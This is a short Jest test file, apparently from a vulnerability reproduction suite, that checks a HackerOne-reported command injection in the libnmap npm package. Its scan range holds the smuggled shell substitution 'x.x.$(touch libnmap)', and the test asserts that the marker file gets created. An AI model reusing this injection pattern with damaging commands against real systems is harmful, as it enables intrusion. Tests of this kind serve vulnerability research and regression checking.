//https://hackerone.com/reports/390865
test("Command Injection in libnmap", () => {
  expect.assertions(2);
  const nmap = require("libnmap");
  const fs = require("fs");
  const path = "./libnmap";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  const opts = {
    range: ["scanme.nmap.org", "x.x.$(touch libnmap)"],
  };
  nmap.scan(opts, function (err, report) {
    for (let item in report) {
      console.log(JSON.stringify(report[item]));
    }
  });
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
